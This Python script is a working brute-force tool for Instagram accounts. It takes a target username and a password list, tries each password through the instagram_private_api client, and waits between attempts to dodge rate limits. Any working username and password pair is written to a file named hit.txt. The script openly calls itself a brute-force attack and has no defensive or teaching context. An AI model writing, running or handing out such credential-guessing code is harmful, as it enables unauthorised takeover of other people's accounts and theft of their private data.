from instagram_private_api import Client, ClientError
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def login_with_credentials(username, password):
    try:
        api = Client(username, password)
        return api
    except ClientError:
        return None

def save_successful_login(username, password):
    with open('hit.txt', 'a') as file:
        file.write(f"Successful login with username: {username} and password: {password}\n")

def brute_force_login(username, password_list):
    for password in password_list:
        api = login_with_credentials(username, password)
        if api:
            logging.info(f"Successfully logged in with username: {username} and password: {password}")
            save_successful_login(username, password)
            return api
        else:
            logging.info(f"Trying password: {password}")
            time.sleep(1)  # Add a delay to avoid rate limit
    logging.info("Brute-force attack failed.")
    return None

# Input username
username = input("Enter the Instagram username: ")

# Input password list file
password_file = input("Enter the path to the password list file: ")
with open(password_file, 'r') as file:
    password_list = file.read().splitlines()

# Perform brute-force attack
api = brute_force_login(username, password_list)

if api:
    logging.info("Brute-force attack successful.")
else:
    logging.info("Brute-force attack failed.")